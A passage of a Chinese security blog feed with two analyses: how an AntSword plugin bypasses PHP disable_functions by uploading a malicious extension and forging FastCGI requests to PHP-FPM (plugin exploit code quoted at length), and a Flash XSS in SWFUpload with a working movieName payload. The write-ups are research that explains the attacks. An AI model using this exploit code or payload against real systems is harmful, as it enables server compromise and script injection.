class="headerlink" title="0x02 原理分析"></a>0x02 原理分析</h2><p>简单地说，就是利用WebShell去连接本地的PHP-FPM端口搞事情，让其另起一个不以php.ini为配置的PHP程序，然后通过连接上传的代理文件直接绕过了原本的PHP程序，从而绕过disable_functions的限制。</p><h3 id="antproxy-php分析"><a href="#antproxy-php分析" class="headerlink" title=".antproxy.php分析"></a>.antproxy.php分析</h3><p>看下.antproxy.php中的代码，向本地监听的63611端口的index.php发送请求：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">        set_time_limit(<span class="number">120</span>);</span><br><span class="line">        $aAccess = curl_init();</span><br><span class="line">        curl_setopt($aAccess, CURLOPT_URL, <span class="string">"http://127.0.0.1:63611/index.php?"</span>.$_SERVER[<span class="string">'QUERY_STRING'</span>]);</span><br><span class="line">        ...</span><br></pre></td></tr></table></figure><p>我们在目标服务器执行netstat看看是不是开启了63611端口的监听：</p><p><img src="/2019/08/03/从蚁剑插件看利用PHP-FPM绕过disable-functions/7.png" alt=""></p><p>确实开启了，那这个端口到底属于哪个进程的呢？我们直接ps命令看看：</p><p><img src="/2019/08/03/从蚁剑插件看利用PHP-FPM绕过disable-functions/8.png" alt=""></p><p>可以看到，启用的程序的命令为：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -n -S 127.0.0.1:63611 -t /var/www/html</span><br></pre></td></tr></table></figure><p>解释一下里面的几个参数：</p><ul><li>-S 127.0.0.1:63611：新Web服务的监听地址；</li><li>-t /var/www/html/：新HTTP服务的Web根目录，可随便指，只要保证那个目录下面有个PHP WebShell就行，建议是直接指定成Shell当前目录；</li><li>-n：表示不使用php.ini，这个新的服务PHP用的是默认配置，是核心所在，从而根本不受php.ini中disable_functions的影响，当使用代理连接到该PHP服务时也就实现Bypass了；</li></ul><h3 id="插件源码分析"><a href="#插件源码分析" class="headerlink" title="插件源码分析"></a>插件源码分析</h3><p>我们看下蚁剑绕过disable_functions的插件的主要代码，代码在：<a href="https://github.com/Medicean/as_bypass_php_disable_functions/blob/7d28318c5f0a795dc96bda95e37d04a05b5bf2a2/core/php_fpm/index.js" target="_blank" rel="noopener">https://github.com/Medicean/as_bypass_php_disable_functions/blob/7d28318c5f0a795dc96bda95e37d04a05b5bf2a2/core/php_fpm/index.js</a></p><p>这里我们直接看exploit()函数，这里插件exp编写的地方：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 执行EXP, 必须有这个函数</span></span><br><span class="line">exploit() &#123;</span><br><span class="line">  <span class="keyword">let</span> self = <span class="keyword">this</span>;</span><br><span class="line">  <span class="keyword">let</span> fpm_host = <span class="string">''</span>;</span><br><span class="line">  <span class="keyword">let</span> fpm_port = <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">let</span> port = <span class="built_in">Math</span>.floor(<span class="built_in">Math</span>.random() * <span class="number">5000</span>) + <span class="number">60000</span>; <span class="comment">// 60000~65000</span></span><br><span class="line">  <span class="keyword">if</span> (self.form.validate()) &#123;</span><br><span class="line">    self.cell.progressOn();</span><br><span class="line">    <span class="keyword">let</span> core = self.top.core;</span><br><span class="line">    <span class="keyword">let</span> formvals = self.form.getValues();</span><br><span class="line">    <span class="keyword">let</span> phpbinary = formvals[<span class="string">'phpbinary'</span>];</span><br><span class="line">    formvals[<span class="string">'fpm_addr'</span>] = formvals[<span class="string">'fpm_addr'</span>].toLowerCase();</span><br><span class="line">    <span class="keyword">if</span> (formvals[<span class="string">'fpm_addr'</span>].startsWith(<span class="string">'unix:'</span>)) &#123;</span><br><span class="line">      fpm_host = formvals[<span class="string">'fpm_addr'</span>];</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (formvals[<span class="string">'fpm_addr'</span>].startsWith(<span class="string">'/'</span>)) &#123;</span><br><span class="line">      fpm_host = <span class="string">`unix://<span class="subst">$&#123;formvals[<span class="string">'fpm_addr'</span>]&#125;</span>`</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      fpm_host = formvals[<span class="string">'fpm_addr'</span>].split(<span class="string">':'</span>)[<span class="number">0</span>] || <span class="string">''</span>;</span><br><span class="line">      fpm_port = <span class="built_in">parseInt</span>(formvals[<span class="string">'fpm_addr'</span>].split(<span class="string">':'</span>)[<span class="number">1</span>]) || <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 生成 ext</span></span><br><span class="line">    <span class="keyword">let</span> wdir = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">if</span> (self.isOpenBasedir) &#123;</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">var</span> v <span class="keyword">in</span> self.top.infodata.open_basedir) &#123;</span><br><span class="line">        <span class="keyword">if</span> (self.top.infodata.open_basedir[v] == <span class="number">1</span>) &#123;</span><br><span class="line">          <span class="keyword">if</span> (v == self.top.infodata.phpself) &#123;</span><br><span class="line">            wdir = v;</span><br><span class="line">          &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            wdir = v;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      wdir = self.top.infodata.temp_dir;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">let</span> cmd = <span class="string">`<span class="subst">$&#123;phpbinary&#125;</span> -n -S 127.0.0.1:<span class="subst">$&#123;port&#125;</span> -t <span class="subst">$&#123;self.top.infodata.phpself&#125;</span>`</span>;</span><br><span class="line">    <span class="keyword">let</span> fileBuffer = self.generateExt(cmd);</span><br><span class="line">    <span class="keyword">if</span> (!fileBuffer) &#123;</span><br><span class="line">      toastr.warning(PHP_FPM_LANG[<span class="string">'msg'</span>][<span class="string">'genext_err'</span>], LANG_T[<span class="string">"warning"</span>]);</span><br><span class="line">      self.cell.progressOff();</span><br><span class="line">      <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">res, rej</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">var</span> ext_path = <span class="string">`<span class="subst">$&#123;wdir&#125;</span>/.<span class="subst">$&#123;<span class="built_in">String</span>(<span class="built_in">Math</span>.random()).substr(<span class="number">2</span>, <span class="number">5</span>)&#125;</span><span class="subst">$&#123;self.ext_name&#125;</span>`</span>;</span><br><span class="line">      <span class="comment">// 上传 ext</span></span><br><span class="line">      core.request(</span><br><span class="line">        core.filemanager.upload_file(&#123;</span><br><span class="line">          path: ext_path,</span><br><span class="line">          content: fileBuffer</span><br><span class="line">        &#125;)</span><br><span class="line">      ).then(<span class="function">(<span class="params">response</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">var</span> ret = response[<span class="string">'text'</span>];</span><br><span class="line">        <span class="keyword">if</span> (ret === <span class="string">'1'</span>) &#123;</span><br><span class="line">          toastr.success(<span class="string">`Upload extension <span class="subst">$&#123;ext_path&#125;</span> success.`</span>, LANG_T[<span class="string">'success'</span>]);</span><br><span class="line">          res(ext_path);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          rej(<span class="string">"upload extension fail"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;).catch(<span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">        rej(err)</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;).then(<span class="function">(<span class="params">p</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="comment">// 触发 payload, 会超时</span></span><br><span class="line">      <span class="keyword">var</span> payload = <span class="string">`<span class="subst">$&#123;FastCgiClient()&#125;</span>;</span></span><br><span class="line"><span class="string">        $content="";</span></span><br><span class="line"><span class="string">        $client = new Client('<span class="subst">$&#123;fpm_host&#125;</span>',<span class="subst">$&#123;fpm_port&#125;</span>);</span></span><br><span class="line"><span class="string">        $client-&gt;request(array(</span></span><br><span class="line"><span class="string">          'GATEWAY_INTERFACE' =&gt; 'FastCGI/1.0',</span></span><br><span class="line"><span class="string">          'REQUEST_METHOD' =&gt; 'POST',</span></span><br><span class="line"><span class="string">          'SERVER_SOFTWARE' =&gt; 'php/fcgiclient',</span></span><br><span class="line"><span class="string">          'REMOTE_ADDR' =&gt; '127.0.0.1',</span></span><br><span class="line"><span class="string">          'REMOTE_PORT' =&gt; '9984',</span></span><br><span class="line"><span class="string">          'SERVER_ADDR' =&gt; '127.0.0.1',</span></span><br><span class="line"><span class="string">          'SERVER_PORT' =&gt; '80',</span></span><br><span class="line"><span class="string">          'SERVER_NAME' =&gt; 'mag-tured',</span></span><br><span class="line"><span class="string">          'SERVER_PROTOCOL' =&gt; 'HTTP/1.1',</span></span><br><span class="line"><span class="string">          'CONTENT_TYPE' =&gt; 'application/x-www-form-urlencoded',</span></span><br><span class="line"><span class="string">          'PHP_VALUE' =&gt; 'extension=<span class="subst">$&#123;p&#125;</span>',</span></span><br><span class="line"><span class="string">          'PHP_ADMIN_VALUE' =&gt; 'extension=<span class="subst">$&#123;p&#125;</span>',</span></span><br><span class="line"><span class="string">          'CONTENT_LENGTH' =&gt; strlen($content)</span></span><br><span class="line"><span class="string">          ),</span></span><br><span class="line"><span class="string">          $content</span></span><br><span class="line"><span class="string">        );</span></span><br><span class="line"><span class="string">        sleep(1);</span></span><br><span class="line"><span class="string">        echo(1);</span></span><br><span class="line"><span class="string">      `</span>;</span><br><span class="line">      core.request(&#123;</span><br><span class="line">        _: payload,</span><br><span class="line">      &#125;).then(<span class="function">(<span class="params">response</span>) =&gt;</span> &#123;</span><br><span class="line"></span><br><span class="line">      &#125;).catch(<span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="comment">// 超时也是正常</span></span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;).then(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">      <span class="comment">// 验证是否成功开启</span></span><br><span class="line">      <span class="keyword">var</span> payload = <span class="string">`sleep(1);</span></span><br><span class="line"><span class="string">        $fp = @fsockopen("127.0.0.1", <span class="subst">$&#123;port&#125;</span>, $errno, $errstr, 1);</span></span><br><span class="line"><span class="string">        if(!$fp)&#123;</span></span><br><span class="line"><span class="string">          echo(0);</span></span><br><span class="line"><span class="string">        &#125;else&#123;</span></span><br><span class="line"><span class="string">          echo(1);</span></span><br><span class="line"><span class="string">          @fclose($fp);</span></span><br><span class="line"><span class="string">        &#125;;`</span></span><br><span class="line">      core.request(&#123;</span><br><span class="line">        _: payload,</span><br><span class="line">      &#125;).then(<span class="function">(<span class="params">response</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">var</span> ret = response[<span class="string">'text'</span>];</span><br><span class="line">        <span class="keyword">if</span> (ret === <span class="string">'1'</span>) &#123;</span><br><span class="line">          toastr.success(LANG[<span class="string">'success'</span>], LANG_T[<span class="string">'success'</span>]);</span><br><span class="line">          self.uploadProxyScript(<span class="string">"127.0.0.1"</span>, port);</span><br><span class="line">          self.cell.progressOff();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          self.cell.progressOff();</span><br><span class="line">          <span class="keyword">throw</span> (<span class="string">"exploit fail"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;).catch(<span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">        self.cell.progressOff();</span><br><span class="line">        toastr.error(<span class="string">`<span class="subst">$&#123;LANG[<span class="string">'error'</span>]&#125;</span>: <span class="subst">$&#123;<span class="built_in">JSON</span>.stringify(err)&#125;</span>`</span>, LANG_T[<span class="string">'error'</span>]);</span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;).catch(<span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">      self.cell.progressOff();</span><br><span class="line">      toastr.error(<span class="string">`<span class="subst">$&#123;LANG[<span class="string">'error'</span>]&#125;</span>: <span class="subst">$&#123;<span class="built_in">JSON</span>.stringify(err)&#125;</span>`</span>, LANG_T[<span class="string">'error'</span>]);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    self.cell.progressOff();</span><br><span class="line">    toastr.warning(LANG[<span class="string">'form_not_comp'</span>], LANG_T[<span class="string">"warning"</span>]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中generateExt()函数的定义在Base.js中：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 生成扩展</span></span><br><span class="line">generateExt(cmd) &#123;</span><br><span class="line">  <span class="keyword">let</span> self = <span class="keyword">this</span>;</span><br><span class="line">  <span class="keyword">let</span> fileBuff = fs.readFileSync(self.ext_path);</span><br><span class="line">  <span class="keyword">let</span> start = <span class="number">0</span>, end = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">switch</span> (self.ext_name) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">'ant_x86.so'</span>:</span><br><span class="line">      start = <span class="number">275</span>;</span><br><span class="line">      end = <span class="number">504</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">'ant_x64.so'</span>:</span><br><span class="line">      <span class="comment">// 434-665</span></span><br><span class="line">      start = <span class="number">434</span>;</span><br><span class="line">      end = <span class="number">665</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">'ant_x86.dll'</span>:</span><br><span class="line">      start = <span class="number">1544</span>;</span><br><span class="line">      end = <span class="number">1683</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">'ant_x64.dll'</span>:</span><br><span class="line">      start = <span class="number">1552</span>;</span><br><span class="line">      end = <span class="number">1691</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span>(cmd.length &gt; (end - start)) &#123;</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">  &#125;</span><br><span class="line">  fileBuff[end] = <span class="number">0</span>;</span><br><span class="line">  fileBuff.write(<span class="string">"                    "</span>, start);</span><br><span class="line">  fileBuff.write(cmd, start);</span><br><span class="line">  <span class="keyword">return</span> fileBuff;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>简单说下过程：</p><ol><li>随机生成一个端口号，作为后续新起的PHP服务的端口；</li><li>判断当前PHP-FPM为TCP模式或Unix Socket模式来据此获得FPM地址和端口，用于后面和服务器中FPM服务的访问；</li><li>以拼接组成的用于启动新PHP服务的命令的cmd变量为参数，调用generateExt()生成扩展，将cmd内容插入到指定范围内去；</li><li>将扩展命名为.xxxxxant_x64.so并上传；</li><li>上传成功后，构造并触发payload：先初始化FastCgi客户端，再构造连接服务端PHP-FPM服务的fastcgi协议包、指定PHP_VALUE和PHP_ADMIN_VALUE为上传的扩展文件，最后向目标服务端PHP-FPM服务发送该fastcgi协议请求包，目的是加载执行上传的ext文件、从而新起一个PHP进程；</li><li>最后尝试连接本地前面随机生成的端口号，确认payload是否触发成功，若OK则上传代理脚本；</li></ol><h3 id="69773ant-x64-so分析"><a href="#69773ant-x64-so分析" class="headerlink" title=".69773ant_x64.so分析"></a>.69773ant_x64.so分析</h3><p>从前面的代码中的generateExt()函数知道，是直接对二进制数据操作，在start到end中填入cmd。</p><p>这里我们将该so文件下载下来，本想逆向看下给出的几个基础框架文件是怎么写的，但是因为so文件格式不对无法用ida直接看.69773ant_x64.so文件，所以这里是用ida打开的Windows版本的<a href="https://github.com/Medicean/as_bypass_php_disable_functions/blob/master/ext/ant_x64.dll" target="_blank" rel="noopener">ant_x64.dll</a>文件进行查看分析：</p><p><img src="/2019/08/03/从蚁剑插件看利用PHP-FPM绕过disable-functions/9.png" alt=""></p><p>可以看到，构造很简单，只有一个函数用于调用执行system()，而start和end区域（ant_x64.dll为1552~1691）就是system()函数内参数的区域，直接往里写就能执行恶意命令，简单粗暴：</p><p><img src="/2019/08/03/从蚁剑插件看利用PHP-FPM绕过disable-functions/10.png" alt=""></p><p>这里我们也用WinHex打开.69773ant_x64.so（434~665）文件查看对应区域的内容，确实填充的是新起PHP服务的命令：</p><p><img src="/2019/08/03/从蚁剑插件看利用PHP-FPM绕过disable-functions/11.png" alt=""></p><h2 id="0x03-小结"><a href="#0x03-小结" class="headerlink" title="0x03 小结"></a>0x03 小结</h2><p>若目标站点是使用PHP-FPM的方式启动PHP服务的，且存在WebShell文件、开启了disable_functions限制了包括putenv()等函数及未设置open_basedir，则我们可以通过这种方式进行Bypass：</p><p>编写恶意的so/dll文件，其中调用system()函数执行类似于<code>php -n -S 127.0.0.1:63611 -t /var/www/html</code>的命令，用于以php命令新启动一个Web服务；通过WebShell上传该恶意so文件到目标服务器中如tmp目录中；通过PHP代码执行建立FastCgi客户端和目标服务器内部的PHP-FPM进行通信，伪造FastCgi协议包并设置PHP_VALUE和PHP_ADMIN_VALUE为上传的so文件从而可以加载执行该恶意so文件；最后通过WebShell上传代理新起Web服务的PHP文件即可。</p><p><strong>一个小问题</strong></p><p>既然我们上传的ext文件可以通过攻击PHP-FPM的方式来执行命令，为何还要新起一个PHP服务呢？</p><p>这个本人还没细究，但可以看下参考文章最后补充的回复。</p><h2 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h2><p><a href="https://xz.aliyun.com/t/5839" target="_blank" rel="noopener">蚁剑disable_functions研究</a></p><p><a href="https://github.com/ttttmr/php-fpm" target="_blank" rel="noopener">用WebShell攻击PHP-FPM</a></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="PHP" scheme="https://www.mi1k7ea.com/categories/PHP/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="PHP" scheme="https://www.mi1k7ea.com/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>SWFUpload.swf的Flash型XSS分析</title>
    <link href="https://www.mi1k7ea.com/2019/07/31/SWFUpload-swf%E7%9A%84Flash%E5%9E%8BXSS%E5%88%86%E6%9E%90/"/>
    <id>https://www.mi1k7ea.com/2019/07/31/SWFUpload-swf的Flash型XSS分析/</id>
    <published>2019-07-31T13:35:24.000Z</published>
    <updated>2019-07-31T14:24:03.606Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-SWFUpload简介"><a href="#0x01-SWFUpload简介" class="headerlink" title="0x01 SWFUpload简介"></a>0x01 SWFUpload简介</h2><p>SWFUpload是一个客户端文件上传工具，最初由Vinterwebb.se开发，它通过整合Flash与JavaScript技术为Web开发者提供了一个具有丰富功能继而超越传统标签的文件上传模式。</p><p>SWFUpload是在国内网站中使用得比较普遍的Flash插件。</p><h2 id="0x02-Flash-XSS"><a href="#0x02-Flash-XSS" class="headerlink" title="0x02 Flash XSS"></a>0x02 Flash XSS</h2><p>当SWFUpload的版本&lt;= 时，会存在Flash XSS漏洞。</p><p>漏洞版本下载地址：<a href="https://github.com/JoyChou93/FlashXss/tree/master/swfupload" target="_blank" rel="noopener">https://github.com/JoyChou93/FlashXss/tree/master/swfupload</a></p><p>将文件下载下来后，反编译得到as源代码，可以看到脚本是有三个，这里先关注SWFUpload的代码：</p><p><img src="/2019/07/31/SWFUpload-swf的Flash型XSS分析/1.png" alt=""></p><p>SWFUpload的代码量略大，这里直接搜索外部参数输入的关键字，找到对应的代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">public function SWFUpload()</span><br><span class="line">      &#123;</span><br><span class="line">         ...</span><br><span class="line">         this.movieName = root.loaderInfo.parameters.movieName;</span><br><span class="line">         this.flashReady_Callback = &quot;SWFUpload.instances[\&quot;&quot; + this.movieName + &quot;\&quot;].flashReady&quot;;</span><br><span class="line">         this.fileDialogStart_Callback = &quot;SWFUpload.instances[\&quot;&quot; + this.movieName + &quot;\&quot;].fileDialogStart&quot;;</span><br><span class="line">         this.fileQueued_Callback = &quot;SWFUpload.instances[\&quot;&quot; + this.movieName + &quot;\&quot;].fileQueued&quot;;</span><br><span class="line">         this.fileQueueError_Callback = &quot;SWFUpload.instances[\&quot;&quot; + this.movieName + &quot;\&quot;].fileQueueError&quot;;</span><br><span class="line">         this.fileDialogComplete_Callback = &quot;SWFUpload.instances[\&quot;&quot; + this.movieName + &quot;\&quot;].fileDialogComplete&quot;;</span><br><span class="line">         this.uploadStart_Callback = &quot;SWFUpload.instances[\&quot;&quot; + this.movieName + &quot;\&quot;].uploadStart&quot;;</span><br><span class="line">         this.uploadProgress_Callback = &quot;SWFUpload.instances[\&quot;&quot; + this.movieName + &quot;\&quot;].uploadProgress&quot;;</span><br><span class="line">         this.uploadError_Callback = &quot;SWFUpload.instances[\&quot;&quot; + this.movieName + &quot;\&quot;].uploadError&quot;;</span><br><span class="line">         this.uploadSuccess_Callback = &quot;SWFUpload.instances[\&quot;&quot; + this.movieName + &quot;\&quot;].uploadSuccess&quot;;</span><br><span class="line">         this.uploadComplete_Callback = &quot;SWFUpload.instances[\&quot;&quot; + this.movieName + &quot;\&quot;].uploadComplete&quot;;</span><br><span class="line">         this.debug_Callback = &quot;SWFUpload.instances[\&quot;&quot; + this.movieName + &quot;\&quot;].debug&quot;;</span><br><span class="line">         this.testExternalInterface_Callback = &quot;SWFUpload.instances[\&quot;&quot; + this.movieName + &quot;\&quot;].testExternalInterface&quot;;</span><br><span class="line">         this.cleanUp_Callback = &quot;SWFUpload.instances[\&quot;&quot; + this.movieName + &quot;\&quot;].cleanUp&quot;;</span><br><span class="line">         this.uploadURL = root.loaderInfo.parameters.uploadURL;</span><br><span class="line">         this.filePostName = root.loaderInfo.parameters.filePostName;</span><br><span class="line">         this.fileTypes = root.loaderInfo.parameters.fileTypes;</span><br><span class="line">         this.fileTypesDescription = root.loaderInfo.parameters.fileTypesDescription + &quot; (&quot; + this.fileTypes + &quot;)&quot;;</span><br><span class="line">         this.loadPostParams(root.loaderInfo.parameters.params);</span><br></pre></td></tr></table></figure><p>这里看到好几个变量都是外界可控的，有一个很特别，就是movieName变量，它会被拼接到很多名为xx_Callback的变量值中。我们就跟踪下第一个名为flashReady_Callback变量看看是不是可调用的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if(ExternalCall.Bool(this.testExternalInterface_Callback))</span><br><span class="line">&#123;</span><br><span class="line">ExternalCall.Simple(this.flashReady_Callback);</span><br><span class="line">this.hasCalledFlashReady = true;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，在后面的代码中会作为ExternalCall.Simple()函数的唯一参数传入调用。</p><p>而ExternalCall.Simple()函数的定义是在另一个名为ExternalCall脚本中，我们到其中搜索看看：</p><p><img src="/2019/07/31/SWFUpload-swf的Flash型XSS分析/2.png" alt=""></p><p>bingo，是ExternalInterface.call()函数，且是第一个参数外部可控，妥妥的Flash XSS漏洞。</p><p>理下思路，存在AS3形式的loaderInfo.parameters来传入外部参数movieName，且存在ExternalInterface.call()函数的第一个参数外部可控，结合导致Flash XSS。</p><p>至于其他几个拼接的变量也是一样的分析。</p><p>这里结合ExternalInterface.call()函数的第一个参数的payload的形式，稍微修改下来闭合前面拼接的格式即可：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?movieName=&quot;])&#125;catch(e)&#123;alert(&apos;mi1k7ea&apos;)&#125;;//</span><br></pre></td></tr></table></figure><p>接着就是不停地弹框了：</p><p><img src="/2019/07/31/SWFUpload-swf的Flash型XSS分析/3.png" alt=""></p><p>在IE下调试，可以看到底层被恶意构造输入注入的执行的JS代码：</p><p><img src="/2019/07/31/SWFUpload-swf的Flash型XSS分析/4.png" alt=""></p><h2 id="0x03-参考"><a href="#0x03-参考" class="headerlink" title="0x03 参考"></a>0x03 参考</h2><p><a href="https://www.freebuf.com/sectool/108568.html" target="_blank" rel="noopener">Flash XSS检测脚本的简单实现</a></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Web安全基础" scheme="https://www.mi1k7ea.com/categories/Web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="XSS" scheme="https://www.mi1k7ea.com/tags/XSS/"/>
    
      <category term="Flash" scheme="https://www.mi1k7ea.com/tags/Flash/"/>
    
  </entry>
  
  <entry>
    <title>ZeroClipboard.swf的Flash型XSS分析</title>
    <link href="https://www.mi1k7ea.com/2019/07/30/ZeroClipboard-swf%E7%9A%84Flash%E5%9E%8BXSS%E5%88%86%E6%9E%90/"/>
    <id>https://www.mi1k7ea.com/2019/07/30/ZeroClipboard-swf的Flash型XSS分析/</id>
    <published>2019-07-30T14:05:19.000Z</published>
